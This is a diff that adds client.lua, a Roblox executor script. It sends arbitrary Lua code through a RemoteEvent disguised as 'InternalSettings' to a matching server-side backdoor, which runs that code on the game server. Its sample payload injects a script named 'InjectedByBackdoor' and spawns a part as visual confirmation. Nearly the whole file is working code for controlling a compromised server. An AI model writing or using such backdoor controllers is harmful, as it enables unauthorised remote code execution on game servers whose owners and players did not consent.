@@ -1,0 +1,27 @@
+-- client.lua
+-- Run this in your executor to control the server.
+
+local REMOTE_NAME = "InternalSettings" -- Must match server.lua
+local targetRemote = game:GetService("ReplicatedStorage"):WaitForChild(REMOTE_NAME)
+
+local function runOnServer(code)
+    targetRemote:FireServer(code)
+end
+
+-- The actual command: Making a new script in Workspace
+local myCode = [[
+    local newScript = Instance.new("Script")
+    newScript.Name = "InjectedByBackdoor"
+    newScript.Source = "print('Server-side script is now active!')"
+    newScript.Parent = workspace
+    
+    -- Visual confirmation
+    local p = Instance.new("Part", workspace)
+    p.Size = Vector3.new(5, 5, 5)
+    p.Position = Vector3.new(0, 50, 0)
+    p.BrickColor = BrickColor.new("Bright green")
+    p.Anchored = true
+]]
+
+runOnServer(myCode)
+print("Payload sent to server.")
